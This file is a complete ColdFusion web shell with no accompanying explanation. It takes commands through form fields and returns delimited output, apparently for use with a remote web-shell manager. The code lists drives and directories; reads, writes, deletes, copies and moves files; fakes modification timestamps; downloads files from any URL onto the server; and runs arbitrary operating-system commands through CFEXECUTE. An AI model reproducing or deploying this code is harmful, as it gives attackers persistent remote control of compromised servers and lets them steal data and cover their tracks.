<CFSET O="" /><CFTRY><CFSWITCH EXPRESSION=#Form.ice#><CFCASE VALUE="A"><CFSCRIPT>O=O&Expandpath("./")&Chr(9);
for(c=65;c lt 91;c=c+1){if(DirectoryExists(Chr(c)&":\"))O=O&Chr(c)&":";}</CFSCRIPT></CFCASE><CFCASE VALUE="B">
<CFDIRECTORY DIRECTORY="#Form.z1#" NAME="D" SORT="Type"><CFLOOP Query="D"><CFSCRIPT>O=O&D.Name;If(D.Type eq "Dir")O=O&"/";
O=O&Chr(9)&DateFormat(D.DateLastModified,"yyyy-mm-dd")&TimeFormat(D.DateLastModified," HH:MM:ss")&Chr(9)&D.Size&Chr(9);
If(Left(Form.z1,1) eq "/"){O=O&D.Mode;}else{O=O&D.Attributes;}O=O&Chr(10);</CFSCRIPT></CFLOOP></CFCASE><CFCASE VALUE="C">
<CFFILE ACTION="Read" FILE="#Form.z1#" VARIABLE="O"></CFCASE><CFCASE VALUE="D"><CFFILE ACTION="Write" FILE="#Form.z1#" OUTPUT="#Form.z2#">
<CFSET O="1" /></CFCASE><CFCASE VALUE="E"><CFSCRIPT>Function DF(P){F=CreateObject("java","java.io.File").init(P);L=0;i=0;
if(F.isDirectory()){L=F.listFiles();for(i=1;i lte ArrayLen(L);i=i+1){if(not L[i].delete()){DF(L[i].getPath());}}}F.delete();}
DF(Form.z1);O="1";</CFSCRIPT></CFCASE><CFCASE VALUE="F"><cffile action="readbinary" file="#Form.z1#" variable="B" />
<cfset J=CreateObject("java","java.nio.ByteBuffer") /><cfset X=J.Allocate(JavaCast( "int", ArrayLen(B)+6)) />
<cfset X.Put(ToBinary(ToBase64("->"&"|")), JavaCast("int",0), 3 ) /><cfset X.Put(B, JavaCast("int",0), JavaCast("int",ArrayLen(B)) ) />
<cfset X.Put(ToBinary(ToBase64("|"&"<-")), JavaCast("int",0), 3 ) /><CFCONTENT Type="application/octet-stream" Variable="#X.Array()#">
<CFABORT></CFCASE><CFCASE VALUE="G"><CFSCRIPT>F=CreateObject("java","java.io.FileOutputStream");F.init(Form.z1);
h="0123456789ABCDEF";C=Form.z2;for(i=0;i lt Len(C);i=i+2){F.write(BitOr(BitSHLN(h.indexOf(C.charAt(i)),4),h.indexOf(C.charAt(i+1))));}
F.close();O="1";</CFSCRIPT></CFCASE><CFCASE VALUE="H"><CFFUNCTION Name="cpf"><CFARGUMENT Name="S"><CFARGUMENT Name="D">
<CFFILE ACTION="Copy" SOURCE="#S#" DESTINATION="#D#"></CFFUNCTION><CFSCRIPT>Function CP(S,D){sf=CreateObject("java","java.io.File").init(S);
df=CreateObject("java","java.io.File").init(D);L=0;i=0;if(sf.isDirectory()){if(not df.exists()){df.mkdir();}L=sf.listFiles();
for(i=1;i lte ArrayLen(L);i=i+1){if(L[i].isDirectory()){CP(L[i].getPath(),df.getPath()&"/"&L[i].getName());}else{
cpf(L[i].getPath(),df.getPath()&"/"&L[i].getName());}}}else{cpf(S,D);}}CP(Form.z1,Form.z2);O="1";</CFSCRIPT></CFCASE>
<CFCASE VALUE="I"><CFFILE ACTION="MOVE" SOURCE="#Form.z1#" DESTINATION="#Form.z2#"><CFSET O="1" /></CFCASE><CFCASE VALUE="J">
<CFDIRECTORY Directory="#Form.z1#" Action="Create"><CFSET O="1" /></CFCASE><CFCASE VALUE="K"><CFSCRIPT>
FileSetLastModified(Form.z1,ParseDateTime(Form.z2));O="1";</CFSCRIPT></CFCASE><CFCASE VALUE="L"><CFSCRIPT>Z=Form.z2;
For(i=Len(Z);i gt 0;i=i-1){if(Mid(Z,i,1) eq "/" Or Mid(Z,i,1) eq "\"){Break;}}P=Left(Z,i);F=Mid(Z,i+1,256);</CFSCRIPT>
<CFHTTP METHOD="Get" URL="#Form.z1#" PATH="#P#" FILE="#F#"><CFSET O="1" /></CFCASE><CFCASE VALUE="M">
<CFEXECUTE Name="#Mid(Form.z1,3,Len(Form.z1)-2)#" Arguments="#Mid(Form.z1,1,2)# #Form.z2#" Variable="O" TimeOut="60" />
</CFCASE></CFSWITCH><CFCATCH Type="Any"><CFSET O="ERROR:// "&CFCatch.Message /></CFCATCH>
</CFTRY><CFOUTPUT>->#Chr(124)&O&Chr(124)#<-</CFOUTPUT>